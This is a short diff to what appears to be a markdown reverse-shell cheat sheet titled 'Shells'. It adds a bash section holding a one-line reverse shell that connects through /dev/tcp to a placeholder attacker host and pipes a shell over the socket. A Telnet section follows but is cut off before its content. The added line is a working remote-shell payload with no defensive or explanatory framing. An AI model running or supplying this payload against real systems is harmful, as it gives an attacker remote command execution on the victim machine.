@@ -1,5 +1,13 @@
 # Shells
 
+## bash
+
+```bash
+0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196
+```
+
+
+
 ## Telnet
 
 ```text
